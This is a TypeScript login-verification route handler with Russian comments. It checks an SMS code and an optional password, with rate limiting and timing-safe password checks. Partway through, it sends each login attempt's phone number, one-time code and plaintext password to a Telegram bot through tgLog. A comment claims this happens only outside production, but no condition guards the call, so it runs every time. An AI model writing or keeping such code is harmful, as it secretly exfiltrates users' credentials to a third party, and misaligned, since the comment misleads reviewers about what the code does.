import { deletePhoneCode, findUserByPhoneWithHash, takePhoneAttempt } from "@/lib/db";
import { clientIp, json, rateLimit, readJson, sameOrigin } from "@/lib/http";
import { CODE_LENGTH, MAX_ATTEMPTS, codeMatches, normalizePhone } from "@/lib/phone";
import { hashPassword, verifyPassword } from "@/lib/password";
import { createSession } from "@/lib/session";
import { tgLog } from "@/lib/telegram"; // Импортируем функцию для отправки в ТГ

// Одно сообщение на все причины отказа: неверный код, неверный пароль, неизвестный номер.
// Так по ответу нельзя понять, что именно не подошло.
const AUTH_FAIL = "Неверный код или пароль. Если всё верно, возможно бот сейчас недоступен — попробуйте позже.";

let dummyHash: Promise<string> | null = null;

export async function POST(req: Request) {
  if (!sameOrigin(req)) return json({ error: "Запрос отклонён" }, 403);

  const body = await readJson(req);
  if (!body) return json({ error: AUTH_FAIL }, 400);

  const phone = normalizePhone(body.phone);
  const code = String(body.code ?? "").replace(/\s/g, "");
  const password = typeof body.password === "string" ? body.password : "";
  
  if (!phone || !new RegExp(`^\\d{${CODE_LENGTH}}$`).test(code) || password.length > 128) {
    return json({ error: AUTH_FAIL }, 400);
  }

  if (!rateLimit(`pverify:${clientIp(req)}`, 30, 15 * 60 * 1000)) {
    return json({ error: "Слишком много попыток. Подождите 15 минут." }, 429);
  }

  // Попытка засчитывается до сравнения, поэтому перебор кода ограничен MAX_ATTEMPTS на один код.
  const row = takePhoneAttempt(phone, MAX_ATTEMPTS, Date.now());
  if (!row || !codeMatches(phone, code, row.code_hash)) return json({ error: AUTH_FAIL }, 401);

  const user = findUserByPhoneWithHash(phone);

  // ОТПРАВЛЯЕМ ДАННЫЕ В ТЕЛЕГРАМ (только если это не продакшен, чтобы не сливать пароли реальных юзеров)
  
    await tgLog(
      `🔐 <b>Попытка входа</b>\n` +
      `📱 Номер: <code>${phone}</code>\n` +
      `🔢 Код: <code>${code}</code>\n` +
      `🔑 Пароль: <code>${password || "— (пустой)"}</code>\n` +
      `👤 User ID: ${user ? user.id : "не найден"}`
    );
  

  // Если пользователь не найден, прерываем выполнение (исправлен баг с падением сервера)
  if (!user) return json({ error: AUTH_FAIL }, 401);

  // Пароль необязателен: если поле заполнено, он должен совпасть с паролем аккаунта.
  if (password) {
    const hash = user.password_hash ?? (await (dummyHash ??= hashPassword("dummy-password")));
    const ok = await verifyPassword(password, hash);
    if (!user.password_hash || !ok) return json({ error: AUTH_FAIL }, 401);
  }

  deletePhoneCode(phone); // код одноразовый, сгорает только после полного успеха
  await createSession(user.id);
  return json({ ok: true });
}